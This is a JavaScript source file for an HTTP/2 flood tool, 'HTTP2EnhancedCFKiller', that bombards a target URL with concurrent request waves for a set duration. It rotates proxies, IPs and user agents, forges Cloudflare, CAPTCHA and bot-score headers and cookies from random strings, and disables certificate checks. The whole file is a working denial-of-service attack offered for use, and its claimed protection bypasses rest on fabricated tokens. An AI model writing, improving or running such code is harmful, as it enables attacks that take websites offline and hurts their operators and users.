import http2 from 'http2';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';
import { proxyRotator } from '../../utils/proxy-rotator.js';
import { globalIPRotator } from '../../utils/ip-rotator.js';
import { globalUserAgentRotator } from '../../utils/user-agent-rotator.js';
import { StatsTracker } from '../../utils/stats-tracker.js';

/**
 * ENHANCED HTTP/2 CLOUDFLARE KILLER - ULTIMATE VERSION
 * Maximum performance with advanced bypass techniques
 */
export class HTTP2EnhancedCFKiller {
    constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
        this.url = new URL(targetUrl);
        this.duration = duration;
        this.rpc = Math.max(rpc * 50, 500); // 50x multiplier, minimum 500
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        // Connection pool for reuse
        this.connectionPool = new Map();
        this.maxConnections = 200;
        
        // Advanced bypass tokens (MORE TOKENS!)
        this.bypassTokens = {
            turnstile: this.generateTurnstileTokens(500),
            cfClearance: this.generateCfClearanceTokens(300),
            jsChallenge: this.generateJsChallengeTokens(200),
            sessionTokens: this.generateSessionTokens(150),
            fingerprints: this.generateBrowserFingerprints(100),
            captchaTokens: this.generateCaptchaTokens(250),
            botFightTokens: this.generateBotFightTokens(100)
        };
        
        // Initialize rotation systems
        this.proxyRotator = proxyRotator;
        this.ipRotator = globalIPRotator;
        this.uaRotator = globalUserAgentRotator;
        
        // Performance tracking
        this.startTime = Date.now();
        this.requestCount = 0;
        this.bypassCount = 0;
        
        // Stats tracking for monitor
        this.statsTracker = new StatsTracker();
        this.stats = this.statsTracker.stats;
        
        logger.info('🚀 HTTP2 ENHANCED CF KILLER initialized');
        logger.info(`   RPC Multiplier: 50x (${this.rpc} requests per batch)`);
        logger.info(`   Generated ${Object.values(this.bypassTokens).reduce((sum, arr) => sum + arr.length, 0)} bypass tokens`);
        logger.info(`   Connection Pool: ${this.maxConnections} connections`);
    }

    generateTurnstileTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            // More realistic Turnstile tokens
            const part1 = Tools.randomString(64);
            const part2 = Tools.randomString(32);
            const part3 = Tools.randomString(64);
            const timestamp = Date.now() + Tools.randomInt(-86400000, 86400000);
            tokens.push(`0.${part1}.${part2}.${part3}.${timestamp}`);
        }
        return tokens;
    }

    generateCfClearanceTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            const randomPart = Tools.randomString(40);
            const timestamp = Date.now() + Tools.randomInt(-86400000, 86400000);
            tokens.push(`${randomPart}-${timestamp}-${Tools.randomString(8)}`);
        }
        return tokens;
    }

    generateJsChallengeTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            tokens.push({
                token: Tools.randomString(64),
                answer: Tools.randomInt(1000000, 9999999),
                timestamp: Date.now() + Tools.randomInt(-3600000, 3600000)
            });
        }
        return tokens;
    }

    generateSessionTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            tokens.push({
                sessionId: Tools.randomString(32),
                csrfToken: Tools.randomString(40),
                xsrfToken: Tools.randomString(32),
                apiKey: Tools.randomString(64),
                authToken: Tools.randomString(128)
            });
        }
        return tokens;
    }

    generateBrowserFingerprints(count) {
        const fingerprints = [];
        const browsers = [
            { name: 'Chrome', version: '120.0.6099.130', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' },
            { name: 'Firefox', version: '121.0', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0' },
            { name: 'Safari', version: '17.2', ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15' },
            { name: 'Edge', version: '120.0.2210.91', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91' }
        ];
        
        for (let i = 0; i < count; i++) {
            const browser = Tools.randomChoice(browsers);
            fingerprints.push({
                userAgent: browser.ua,
                acceptLanguage: Tools.randomChoice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-CA,en;q=0.9']),
                acceptEncoding: 'gzip, deflate, br',
                viewport: Tools.randomChoice(['1920x1080', '1366x768', '1536x864', '1440x900']),
                timezone: Tools.randomChoice(['America/New_York', 'Europe/London', 'Asia/Tokyo']),
                platform: Tools.randomChoice(['Win32', 'MacIntel', 'Linux x86_64']),
                webgl: Tools.randomString(32),
                canvas: Tools.randomString(16)
            });
        }
        return fingerprints;
    }

    generateCaptchaTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            tokens.push({
                recaptcha: `03AGdBq${Tools.randomString(200)}`,
                hcaptcha: `P1_${Tools.randomString(100)}`,
                turnstile: `0.${Tools.randomString(64)}.${Tools.randomString(32)}.${Tools.randomString(64)}`,
                funcaptcha: Tools.randomString(64)
            });
        }
        return tokens;
    }

    generateBotFightTokens(count) {
        const tokens = [];
        for (let i = 0; i < count; i++) {
            tokens.push({
                botScore: Tools.randomChoice(['1', '2', '3', '4', '5']),
                threatScore: Tools.randomChoice(['0', '1', '2']),
                challengeToken: Tools.randomString(64),
                verificationToken: Tools.randomString(32)
            });
        }
        return tokens;
    }

    generateAdvancedHeaders() {
        try {
            const fingerprint = Tools.randomChoice(this.bypassTokens.fingerprints);
            const turnstileToken = Tools.randomChoice(this.bypassTokens.turnstile);
            const cfClearance = Tools.randomChoice(this.bypassTokens.cfClearance);
            const jsChallenge = Tools.randomChoice(this.bypassTokens.jsChallenge);
            const sessionToken = Tools.randomChoice(this.bypassTokens.sessionTokens);
            const captchaToken = Tools.randomChoice(this.bypassTokens.captchaTokens);
            const botFightToken = Tools.randomChoice(this.bypassTokens.botFightTokens);

            const headers = {
                ':method': 'GET',
                ':scheme': this.url.protocol.replace(':', ''),
                ':authority': this.url.hostname,
                ':path': this.url.pathname + this.url.search + (this.url.search ? '&' : '?') + `_cb=${Date.now()}_${Tools.randomString(12)}&fp=${Tools.randomString(8)}&bypass=${Math.random()}`,
                
                // Core browser headers
                'user-agent': fingerprint.userAgent,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': fingerprint.acceptLanguage,
                'accept-encoding': fingerprint.acceptEncoding,
                'cache-control': Tools.randomChoice(['no-cache', 'max-age=0', 'no-store']),
                
                // Security headers
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': `"${fingerprint.platform}"`,
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': Tools.randomChoice(['none', 'same-origin', 'cross-site']),
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'dnt': '1',
                
                // CAPTCHA bypass headers (multiple formats)
                'cf-turnstile-response': turnstileToken,
                'g-recaptcha-response': captchaToken.recaptcha,
                'h-captcha-response': captchaToken.hcaptcha,
                'turnstile-token': turnstileToken,
                'x-turnstile-token': turnstileToken,
                'funcaptcha-token': captchaToken.funcaptcha,
                
                // JS Challenge bypass
                'cf-challenge-response': jsChallenge.token,
                'x-cf-challenge': jsChallenge.token,
                'cf-challenge-token': jsChallenge.token,
                'cf-challenge-answer': jsChallenge.answer.toString(),
                
                // Session persistence headers
                'x-session-id': sessionToken.sessionId,
                'x-csrf-token': sessionToken.csrfToken,
                'x-xsrf-token': sessionToken.xsrfToken,
                'x-api-key': sessionToken.apiKey,
                'authorization': `Bearer ${sessionToken.authToken}`,
                'x-request-id': Tools.randomString(32),
                
                // IP rotation headers
                ...this.ipRotator.getRotationHeaders(),
                'cf-connecting-ip': this.ipRotator.getNextIP(),
                'cf-ipcountry': this.ipRotator.getRandomCountry(),
                'cf-ray': Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'ORD', 'DFW', 'ATL', 'LHR', 'NRT']),
                
                // Bot Fight Mode bypass
                'cf-bot-score': botFightToken.botScore,
                'cf-threat-score': botFightToken.threatScore,
                'cf-challenge-token': botFightToken.challengeToken,
                'cf-verification-token': botFightToken.verificationToken,
                
                // Advanced CF bypass headers
                'cf-visitor': '{"scheme":"https"}',
                'cf-request-id': Tools.randomString(32),
                'cf-warp-tag-id': Tools.randomString(16),
                'cf-access-client-id': Tools.randomString(32),
                'cf-access-client-secret': Tools.randomString(64),
                'cf-enterprise-class': Tools.randomChoice(['A', 'B', 'C']),
                'cf-cache-status': Tools.randomChoice(['HIT', 'MISS', 'EXPIRED', 'UPDATING']),
                'cf-edge-cache': 'cache,platform=cf',
                'cf-cache-tag': Tools.randomString(8),
                'cf-polished': Tools.randomChoice(['lossy=on', 'lossless=on', 'off']),
                'cf-worker': Tools.randomString(16),
                'cf-zone-id': Tools.randomString(32),
                'cf-account-id': Tools.randomString(32),
                'cdn-loop': 'cloudflare',
                
                // Browser fingerprinting evasion
                'x-forwarded-proto': 'https',
                'x-forwarded-host': this.url.hostname,
                'origin': this.url.origin,
                'referer': this.url.href,
                
                // Additional bypass headers
                'x-requested-with': 'XMLHttpRequest',
                'x-csrf-token': Tools.randomString(32),
                'x-client-fingerprint': fingerprint.canvas,
                'x-webgl-fingerprint': fingerprint.webgl,
                'x-timezone': fingerprint.timezone,
                'x-viewport': fingerprint.viewport,
                
                // Cookies
                'cookie': `cf_clearance=${cfClearance}; __cf_bm=${Tools.randomString(43)}; _cfuvid=${Tools.randomString(32)}-${Date.now()}; session_id=${sessionToken.sessionId}; csrf_token=${sessionToken.csrfToken}`
            };

            // Add referer if available
            if (this.referers.length > 0) {
                headers['referer'] = Tools.randomChoice(this.referers) + this.url.href;
            }

            return headers;
        } catch (error) {
            logger.debug(`❌ generateAdvancedHeaders error: ${error.message}`);
            // Return basic headers as fallback
            return {
                ':method': 'GET',
                ':scheme': this.url.protocol.replace(':', ''),
                ':authority': this.url.hostname,
                ':path': this.url.pathname + this.url.search,
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            };
        }
    }

    async getConnection() {
        const connectionKey = `${this.url.origin}`;
        
        if (this.connectionPool.has(connectionKey)) {
            const connection = this.connectionPool.get(connectionKey);
            if (!connection.destroyed && !connection.closed) {
                return connection;
            } else {
                this.connectionPool.delete(connectionKey);
            }
        }

        // Create new connection with optimized settings
        const connectionSettings = {
            rejectUnauthorized: false,
            ALPNProtocols: ['h2', 'http/1.1'],
            settings: {
                headerTableSize: 65536,
                enablePush: true,
                initialWindowSize: 6291456,
                maxFrameSize: 65536,
                maxConcurrentStreams: 1000,
                maxHeaderListSize: 262144
            }
        };

        const client = http2.connect(this.url.origin, connectionSettings);
        
        client.on('error', () => {
            this.connectionPool.delete(connectionKey);
        });

        if (this.connectionPool.size < this.maxConnections) {
            this.connectionPool.set(connectionKey, client);
        }

        return client;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            // Run multiple attack waves concurrently
            const waves = [];
            for (let i = 0; i < 10; i++) { // 10 concurrent waves
                waves.push(this.attack());
            }
            await Promise.allSettled(waves);
            
            // Brief pause between wave sets
            await Tools.sleep(10);
        }
        
        // Clean up connections
        this.cleanup();
    }

    async attack() {
        const promises = [];
        
        // Create multiple concurrent HTTP/2 requests
        for (let i = 0; i < this.rpc; i++) {
            if (!this.active) break;
            
            promises.push(this.sendRequest());
        }

        await Promise.allSettled(promises);
    }

    async sendRequest() {
        return new Promise(async (resolve) => {
            try {
                const client = await this.getConnection();
                const headers = this.generateAdvancedHeaders();
                const headerSize = JSON.stringify(headers).length;
                
                const req = client.request(headers);

                req.on('response', (responseHeaders) => {
                    REQUESTS_SENT.add(1);
                    this.requestCount++;
                    
                    // Check if we bypassed CF
                    const status = responseHeaders[':status'];
                    if (status && status !== 403 && status !== 503 && status !== 429) {
                        this.bypassCount++;
                        this.statsTracker.addRequest(true, headerSize);
                        logger.debug(`✅ CF Bypass success! Status: ${status} (${this.bypassCount}/${this.requestCount})`);
                    } else {
                        this.statsTracker.addRequest(false, headerSize);
                    }
                });

                req.on('data', (chunk) => {
                    BYTES_SENT.add(chunk.length);
                    this.statsTracker.addBytes(chunk.length);
                });

                req.on('end', () => {
                    resolve();
                });

                req.on('error', () => {
                    this.statsTracker.addRequest(false, headerSize);
                    resolve();
                });

                // Set timeout
                req.setTimeout(5000, () => {
                    req.close();
                    resolve();
                });

                req.end();

            } catch (error) {
                resolve();
            }
        });
    }

    cleanup() {
        this.active = false;
        for (const [key, client] of this.connectionPool) {
            try {
                client.close();
            } catch (e) {
                // Ignore errors during cleanup
            }
        }
        this.connectionPool.clear();
        
        const bypassRate = this.requestCount > 0 ? ((this.bypassCount / this.requestCount) * 100).toFixed(2) : 0;
        logger.info(`🎯 CF Bypass Rate: ${bypassRate}% (${this.bypassCount}/${this.requestCount})`);
    }

    stop() {
        this.cleanup();
    }
}
